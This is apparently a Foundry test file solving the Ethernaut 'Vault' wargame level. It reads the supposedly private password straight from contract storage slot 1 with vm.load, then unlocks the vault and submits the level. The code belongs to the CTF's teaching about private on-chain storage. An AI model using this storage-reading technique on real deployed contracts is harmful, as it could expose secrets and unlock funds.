// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {EthernautTest} from "./utils/EthernautTest.sol";
import {VaultFactory} from "../src/factories/VaultFactory.sol";
import {Vault} from "../src/levels/Vault.sol";

import "forge-std/console.sol";

contract VaultTest is EthernautTest {
    function setUp() public override {
        super.setUp();
        VaultFactory factory = new VaultFactory();
        ethernaut.registerLevel(factory);
        levelAddress = ethernaut.createLevelInstance(factory);
    }

    function testSolveVault() public {
        Vault vault = Vault(payable(levelAddress));

        // [START]

        bytes32 password = vm.load(levelAddress, bytes32(uint256(1)));
        vault.unlock(password);

        // console.logBool(vault.locked());
        // console.logBytes32(password);
        assertEq(vault.locked(), false);

        // [END]

        assert(ethernaut.submitLevelInstance(payable(levelAddress)));
    }
}
